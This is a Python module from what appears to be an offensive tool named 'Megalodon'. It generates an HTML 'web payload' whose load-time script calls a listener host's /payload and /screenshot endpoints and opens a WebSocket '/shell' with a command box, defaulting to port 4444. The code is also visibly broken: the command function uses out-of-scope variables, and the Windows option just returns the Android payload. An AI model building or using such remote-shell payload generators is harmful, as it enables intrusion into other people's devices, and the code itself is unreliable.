import json
from pathlib import Path
import time

class WebPayload:
    
    def __init__(self):
        self.output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'web'
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def generate(self, target_os='android'):
        if target_os == 'android':
            return self.generate_android()
        elif target_os == 'windows':
            return self.generate_windows()
        else:
            return self.generate_android()
    
    def generate_android(self):
        html_payload = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Megalodon Payload</title>
    <script>
    function executePayload() {{
        var xhr = new XMLHttpRequest();
        var ip = prompt("Enter target IP:", "{self.get_listener_ip()}");
        var port = prompt("Enter target port:", "{self.get_listener_port()}");
        
        xhr.open('GET', 'http://' + ip + ':' + port + '/payload', true);
        xhr.send();
        
        document.body.innerHTML = "<h1>Loading...</h1>";
        
        var img = new Image();
        img.src = "http://" + ip + ":" + port + "/screenshot";
        
        // Try WebSocket for real-time connection
        try {{
            var ws = new WebSocket('ws://' + ip + ':' + port + '/shell');
            ws.onopen = function() {{
                document.body.innerHTML = "<h1>Connected!</h1>";
                document.body.innerHTML += "<input id='cmd' type='text' style='width:100%' placeholder='Enter command...'>";
                document.body.innerHTML += "<button onclick='sendCmd()'>Execute</button>";
                document.body.innerHTML += "<pre id='output'></pre>";
            }};
            ws.onmessage = function(e) {{
                document.getElementById('output').innerHTML += e.data + "\\n";
            }};
        }} catch(e) {{
            console.log('WebSocket not available');
        }}
    }}
    
    function sendCmd() {{
        var ws = new WebSocket('ws://' + ip + ':' + port + '/shell');
        ws.onopen = function() {{
            ws.send(document.getElementById('cmd').value);
        }};
        ws.onmessage = function(e) {{
            document.getElementById('output').innerHTML += e.data + "\\n";
        }};
    }}
    
    window.onload = function() {{
        executePayload();
    }};
    </script>
</head>
<body>
    <h1>Loading Payload...</h1>
    <p>Please wait while the payload loads</p>
</body>
</html>
'''
        
        output_file = self.output_dir / f"web_payload_{int(time.time())}.html"
        with open(output_file, 'w') as f:
            f.write(html_payload)
        
        print(f"[+] Web payload generated: {output_file}")
        
        return {
            'success': True,
            'payload_file': str(output_file),
            'type': 'web',
            'platform': 'all',
            'message': 'Web payload generated successfully'
        }
    
    def generate_windows(self):
        return self.generate_android()
    
    def get_listener_ip(self):
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '0.0.0.0'
    
    def get_listener_port(self):
        config_file = Path('config/megalodon.json')
        if config_file.exists():
            with open(config_file, 'r') as f:
                config = json.load(f)
                return config.get('listener', {}).get('port', 4444)
        return 4444

def generate(target_os='android'):
    generator = WebPayload()
    return generator.generate(target_os)
